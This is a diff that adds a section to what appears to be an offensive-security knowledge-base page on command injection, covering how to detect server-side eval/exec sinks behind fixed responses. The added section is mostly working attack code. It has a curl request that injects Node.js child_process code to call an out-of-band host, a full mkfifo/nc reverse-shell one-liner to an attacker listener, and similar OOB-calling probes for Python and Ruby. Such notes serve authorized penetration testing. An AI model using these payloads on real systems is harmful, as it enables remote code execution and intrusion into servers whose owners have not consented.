@@ -611,3 +611,24 @@ Note: the backtick form embeds the inner command result as a DNS label; the `$(â
 
 <!-- auto-wired: context-reachable sub-technique pages -->
 - [[latex-injection]]
+
+## Server-side eval/exec sink (fixed-response detection)
+
+An endpoint that returns a FIXED message/200 for every input may be passing a specific parameter to
+`eval()` / a language interpreter and swallowing the error. **Response-diff parameter mining misses
+this** - an invalid payload errors internally and yields the same fixed response, so it gets filtered
+out. Detect with an actual PAYLOAD + OOB callback, and test BOTH the query string AND the body (the
+sink is frequently reachable via only one of them):
+
+```bash
+# Node.js eval sink -> RCE via child_process (query-string param on a POST endpoint):
+curl -sG -X POST --data-urlencode 'cmd=require("child_process").exec("curl http://OOB/x")' TARGET
+#   an OOB callback confirms the sink; then swap in a reverse shell:
+#   require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST PORT >/tmp/f")
+```
+
+Python `eval`/`exec` sinks: probe `__import__("os").system("curl http://OOB/x")`; Ruby `eval`: backticks
+`` `curl http://OOB/x` ``. Always OOB-gate a fixed-response sink before claiming - the response never
+changes, so the callback is the only proof.
+
+<!-- promoted-slug: nodejs-eval-sink-detection -->
